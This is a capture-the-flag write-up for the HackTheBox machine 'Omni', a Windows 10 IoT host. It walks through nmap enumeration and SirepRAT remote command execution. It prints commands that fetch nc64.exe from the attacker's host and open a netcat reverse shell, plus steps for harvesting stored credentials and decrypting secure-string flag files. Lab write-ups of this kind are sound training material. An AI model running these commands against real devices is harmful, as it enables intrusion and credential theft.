# Enumeration
---

## Initial Information

Based on the information provided by HackTheBox, Omni is rated as easy difficulty and is running an unknown Operating System.

## Editing hosts
A domain name can be assigned to the ip address localy in the `/etc/hosts` file to assist in refering to the machine.

```
sudo vim /etc/hosts
[ip] omni.htb
```

## Nmap scan

For scanning the system's TCP ports with nmap, an initial port scan is run which only focuses on finding open ports. The open ports detected are then used in a second scan where the -A flag is used to Enable OS detection, version detection, script scanning, and traceroute.

```
sudo nmap -A -T4 -Pn -oN nmap-scan-all -p$(sudo nmap -p- --min-rate=1000 -T4 omni.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) omni.htb
```

Nmap reveals that port 135, 5985, 8080, 29817, 29819 and 21820 are open. 

Port 8080 shows itself as a upnp service however the version is Microsoft IIS httpd and reveals information about a Windows Device Portal.

Not knowing what this was I searched it up and the first result was regarding Window IoT.

The first search for Windows 10 device portal leads to: Windows Device Portal - Windows IoT &#124; Microsoft Docs (https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal)

Looking at some of the other results, it seems that it's not limited to Windows IoT however I'm enclined to beleive it is running it since that would explain why HackTheBox didn't tell us the Operating System.


# Exploitation

## Discovery

Searching online the service

Mentions of Windows 10 IOT exploits:

https://www.bleepingcomputer.com/news/security/windows-10-iot-core-test-interface-lets-attackers-take-over-devices/


## Exploiting

The articles talk about an exploit using the tool SirepRAT https://github.com/SafeBreach-Labs/SirepRAT

Using the tool we can upload a copy of netcat then execute it to recieve a reverse shell.

Upload nc.exe
```
python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell Invoke-WebRequest 'http://10.10.14.145/nc64.exe' -OutFile 'C:\nc64.exe'" --v
```

Run nc.exe
```
python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\nc64.exe 10.10.14.145 4444 -e cmd.exe" --v
```

NOTE: Running nc.exe gives the error message:
> This version of C:\nc.exe is not compatible with the version of Windows you're running. Check your computer's system information and then contact the software publisher.

I downloaded nc64.exe from https://eternallybored.org/misc/netcat/ which works


# Post Enumeration

With the OS likely being Windows IOT, a lot of commands are missing such as whoami and

Commands such as whoami and systeminfo didn't exist and running them over the network encounters errors, same with winPEAS.

Using powershell we can view the OS version
```
PS C:\windows\system32> [System.Environment]::OSVersion.Version[System.Environment]::OSVersion.Version
```

![Image of os info](/images/htb/omni/osinfo1.png)


Alternative
```
PS U:\Users\app> $Properties = 'Caption', 'CSName', 'Version', 'BuildType', 'OSArchitecture'
$Properties = 'Caption', 'CSName', 'Version', 'BuildType', 'OSArchitecture'
PS U:\Users\app> Get-CimInstance Win32_OperatingSystem | Select-Object $Properties | Format-Table -AutoSize
Get-CimInstance Win32_OperatingSystem | Select-Object $Properties | Format-Table -AutoSize
```

![Image of os info](/images/htb/omni/osinfo2.png)

Looking at the files in `Program Files\WindowsPowershell\Modules\PackageManagement` show scripts with saved credentials in r.bat

![Image of rbat](/images/htb/omni/powershell-rbat.png)

We can try to log inot the web portal with those credentials, then running a command on the site we can try to get aa reverse shell.


# Privilege Escalation

Logging into the web portal with the credentials.

![Image of wdp auth](/images/htb/omni/wdp-auth.png)

![Image of wdp home](/images/htb/omni/wdp-home.png)

Under Processes theres a run command

From there we can run a netcat command to get a reverse shell as the logged on user.

Host a netcat listener
```
nc -nlvp 4444
```

Run netcat on Omni to connect back to us.
```
C:\nc64.exe 10.10.14.145 4444 -e cmd.exe
```

![Image of wdp user](/images/htb/omni/wdp-user.png)

Check user with $env:Username

Now that we know we are logged in as the user, we should be able to decrypt the flag.

Contents of user.txt is encrypted

```
$credential = Import-CliXml -Path U:\Users\app\user.txt

$credential.GetNetowrkCredential().Password
```

![Image of wdp flag](/images/htb/omni/user-flag.png)

It successfully decrypts and displays the user flag.

## Getting Root

To get root, follow the same steps as the user but log into the Windows Device Portal with the Admin credentials.

To decrypt the secure string you can use powershell code found on [hacktricks](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters#secure-string-to-plaintext)

```
$credential = Import-CliXml -Path U:\Users\administrator\root.txt

$credential.GetNetowrkCredential().Password
```

# Problems Encountered

Some of the problems I encountered were:

- Identifying Windows version/running commands
- The version of netcat to use on Omni as I normally use the version of netcat that comes with kali in the windows binaries folder.
- Getting SirepRAT to work

# Conclusion

This was certainly an interesting box. I found it harder than most other easy difficulty boxes because I hadn't touched the technologies involved (windows iot, SirepRAT, Windows Device Manager, windows encrypted passwords)
